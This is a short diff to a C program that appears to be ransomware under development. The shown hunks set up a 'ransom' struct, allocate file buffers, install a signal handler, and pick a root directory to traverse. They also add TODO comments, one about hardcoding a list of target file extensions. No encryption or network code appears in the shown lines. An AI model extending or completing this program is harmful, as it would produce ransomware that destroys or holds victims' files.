@@ -85,6 +85,7 @@ node_t *recurse_ls(char *dirname, ransom_t *ransom)
   * TODO: putting the list of files into a linked list is a massive race condition bug.
   *       It is acceptable here for development
   * TODO: need to eliminate hard coded strings.
+  * TODO: Maybe hardcode file_extension list into the program. Not sure about that though.
  **/
 int main(int ac, char *av[])
 {
@@ -106,14 +107,20 @@ int main(int ac, char *av[])
 	target_file = malloc(sizeof(target_file_t));
 	ransom.target_file_buf = target_file;
 
-/* build target_file_s part of ransom struct */
+	/**
+	  * build target_file_s part of ransom struct
+	  * by allocating space for temporary buffers
+	 **/
 	ransom.target_file_buf->filepath = my_calloc(PATH_MAX, sizeof(char));
 	ransom.target_file_buf->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
 	ransom.target_file_buf->file_offset = 0;
 	ransom.target_file_buf->bytes_read = 0;
 
-	/* handle signals */
+	/** handle signals
+	  * TODO: Account for errors
+	 **/
 	signal(SIGINT, sighandler);
+
 	/* Start building struct */
 	ransom.root_path = ac == 2 ? av[1] : default_dir;
 	if (uname(&sys_info) == -1)
